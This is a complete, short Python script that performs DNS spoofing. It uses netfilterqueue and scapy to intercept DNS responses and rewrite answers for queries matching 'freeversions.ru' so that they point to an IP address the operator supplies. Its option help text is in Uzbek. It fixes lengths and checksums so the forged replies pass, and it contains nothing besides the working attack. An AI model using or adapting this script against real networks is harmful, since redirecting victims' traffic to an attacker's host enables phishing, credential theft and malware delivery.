#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import optparse

def get_parser():
    parsers = optparse.OptionParser()
    parsers.add_option("-i", "--ip", dest = "ip", help= "Siz o'zingizni ip addressni kiriting! ")
    option, argument = parsers.parse_args()
    return option


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        # print("Menga kerakli joy>:", scapy_packet)
        if "freeversions.ru" in qname.decode():
            print("[+]Spoofing target",scapy_packet.show())
            pars = get_parser()
            ip = pars.ip
            answer = scapy.DNSRR(rrname=qname, rdata=str(ip))
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum


            packet.set_payload(bytes(scapy_packet))

    packet.accept()
    # packet.drop()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
